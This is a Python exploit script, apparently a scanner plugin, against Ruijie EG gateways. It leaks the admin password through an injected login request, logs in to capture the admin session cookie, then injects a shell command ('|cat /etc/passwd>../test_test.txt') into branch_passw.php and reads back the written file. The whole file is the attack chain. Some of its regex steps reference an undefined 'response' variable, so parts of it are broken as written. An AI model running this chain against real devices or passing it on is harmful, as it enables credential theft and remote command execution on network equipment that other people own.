#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :   'https://peiqi.wgpsec.org/wiki/iot/锐捷/锐捷 EG易网关 branch_passw.php 远程命令执行.html',

      'huixian'   :   "",

      'method'    :   'post',

      'bugname'   :   '锐捷 EG易网关 Branch_passw.php 远程命令执行漏洞',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run4(url,ua,ruijie_cookie):
  ret = msg()
  headers = {
        'User-Agent': ua,
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "{}".format(ruijie_cookie)
        }
  target = "/test_test.txt"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    if 'root:' in res.text and res.status_code == 200:
      ret['huixian'] = res.text
      res.close()
      return ret
    else:
      return ret

  except:
    return False
def run3(url,ua,ruijie_cookie):
  ret = msg()
  headers = {
        'User-Agent': ua,
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "{}".format(ruijie_cookie)
        }
  data = 'pass=|cat /etc/passwd>../test_test.txt'
  target = "/itbox_pi/branch_passw.php?a=set"
  url1 = url + target
  ret['url'] = url1

  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    if res.status_code == 200:
      run4(url,ua,ruijie_cookie)
    else:
      return ret
  except:
    return ret
def run2(url,ua,password):
  ret = msg()
  headers = {
        'User-Agent': ua,
        "Content-Type": "application/x-www-form-urlencoded",
        }
  data = 'username=admin&password={}'.format(password)
  target = "/login.php"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    if "status" in res.text and '1' in res.text and res.status_code == 200:
      ruijie_cookie = "RUIJIEID=" + re.findall(r"'Set-Cookie': 'RUIJIEID=(.*?);", str(response.headers))[0] + ";user=admin;"
      print('成功获取管理员Cookie:{}'.format(ruijie_cookie))
      run3(url,ua,ruijie_cookie)
    else:
      return ret
  except:
    return ret
def run(url,ua):
  ret = msg()
  headers = {
        'User-Agent': ua,
        "Content-Type": "application/x-www-form-urlencoded",
        }
  data = 'username=admin&password=admin?show+webmaster+user'
  target = "/login.php"
  url1 = url + target
  ret['url'] = url1
  
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    if res.status_code == 200 and "data" in res.text:
      password = re.findall(r'admin (.*?)"', response.text)[0]
      if password:
        run2(url,ua,password)
        ret['huixian'] =res.text
        ret['ifbug'] = True
        res.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret